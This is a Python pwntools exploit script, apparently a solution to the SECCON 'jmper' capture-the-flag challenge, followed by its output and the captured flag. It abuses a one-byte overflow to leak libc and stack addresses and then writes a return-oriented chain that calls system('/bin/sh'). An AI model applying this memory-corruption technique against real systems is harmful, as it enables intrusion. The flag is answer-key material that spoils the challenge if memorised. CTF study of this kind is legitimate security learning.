'''
[*] Paused (press any to continue)
[*] libc_base : 0x7f13814b7000
[*] main stack return : 0x7ffeae832328
[*] Switching to interactive mode
Exception has occurred. Jump!
Nice jump! Bye :)
$ cat flag
SECCON{3nj0y_my_jmp1n9_serv1ce}
'''

from pwn import *
import sys, time

context.binary = "./jmper"
#context.log_level = "debug"
binary = ELF("./jmper")

p = process(["./jmper"])
pause()

def add_stud():
    p.recvuntil(":)\n")
    p.sendline("1")

def set_name(idx, name):
    p.recvuntil(":)\n")
    p.sendline("2")
    p.recvuntil("ID:")
    p.sendline(str(idx))
    p.recvuntil("name:")
    if len(name) == 33:
        p.send(name)
    else:
        p.sendline(name)

def write_memo(idx, memo):
    p.recvuntil(":)\n")
    p.sendline("3")
    p.recvuntil("ID:")
    p.sendline(str(idx))
    p.recvuntil("memo:")
    if len(memo) == 33:
        p.send(memo)
    else:
        p.sendline(memo)

def show_name(idx):
    p.recvuntil(":)\n")
    p.sendline("4")
    p.recvuntil("ID:")
    p.sendline(str(idx))

def show_memo(idx):
    p.recvuntil(":)\n")
    p.sendline("5")
    p.recvuntil("ID:")
    p.sendline(str(idx))

add_stud()      # 0
write_memo(0, "A" * 0x20 + "\x70")
add_stud()      # 1
set_name(0, "B" * 8 + p64(binary.got["puts"]))
show_name(1)
libc_base = u64(p.recvuntil("1.")[:-2].ljust(8, "\x00")) - 0x6f690
log.info("libc_base : " + hex(libc_base))

pop1rdi = 0x0000000000400cc3
system = libc_base + 0x45390
binsh = libc_base + 0x18cd17

set_name(0, "C" * 8 + p64(libc_base + 0x3c6f38))        # leak environ
show_name(1)
ret = u64(p.recvuntil("1.")[:-2].ljust(8, "\x00")) - 0xf0
log.info("main stack return : " + hex(ret))

set_name(0, "D" * 8 + p64(ret))
set_name(1, p64(pop1rdi) + p64(binsh) + p64(system))

for i in xrange(29):
    add_stud()

p.interactive()
